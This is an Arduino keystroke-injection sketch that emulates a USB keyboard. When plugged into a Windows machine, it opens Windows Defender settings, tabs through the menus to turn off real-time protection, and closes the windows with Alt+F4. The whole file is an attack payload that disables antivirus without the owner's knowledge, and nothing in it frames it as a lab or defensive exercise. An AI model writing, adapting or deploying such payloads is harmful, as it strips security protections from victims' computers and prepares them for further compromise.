#include <Keyboard.h> 

// Init function
void setup()
{
  // Begining the stream
  Keyboard.begin();

  // Waiting 500ms for init
  delay(500);

  delay(1000);

  // Open Windows Defender settings
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ESC);
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("Windows Defender Settings");

  delay(100);

  typeKey(KEY_RETURN);

  // Navigate to realtime protection and disable it
  delay(1000);

  typeKey(KEY_RETURN);

  delay(1000);

  typeKey(KEY_RETURN);

  delay(1000);

  typeKey(KEY_TAB);

  delay(250);

  typeKey(KEY_TAB);

  delay(250);

  typeKey(KEY_TAB);

  delay(250);

  typeKey(KEY_TAB);

  typeKey(KEY_RETURN);

  delay(1000);

  typeKey(' ');

  delay(1000);

  typeKey(KEY_LEFT_ARROW);

  delay(500);

  typeKey(KEY_RETURN);

  // Close Settings
  delay(500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  delay(100);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();
}

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

// Unused
void loop() {}
